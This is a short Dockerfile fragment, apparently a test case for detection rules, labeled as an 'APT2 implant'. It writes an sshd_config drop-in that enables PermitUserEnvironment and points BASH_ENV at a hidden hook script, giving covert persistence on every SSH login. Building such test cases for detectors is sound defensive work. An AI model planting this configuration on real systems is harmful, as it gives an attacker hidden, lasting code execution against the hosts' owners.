# APT2 implant: apt2-sshd-setenv (login env injection via sshd_config)
# A sshd_config drop-in enables PermitUserEnvironment and SetEnv a
# BASH_ENV redirection -> sshd_permit_user_environment + sshd_env_injection
# -> sshd_login_env_injection. Config-only persistence via a trusted
# daemon. Variables: (none)
RUN mkdir -p /etc/ssh/sshd_config.d && \
    printf '%s\n' \
        'PermitUserEnvironment yes' \
        'SetEnv BASH_ENV=/opt/.envhook/rc' \
        > /etc/ssh/sshd_config.d/99-env.conf && \
    chown root:root /etc/ssh/sshd_config.d/99-env.conf && \
    chmod 0644 /etc/ssh/sshd_config.d/99-env.conf
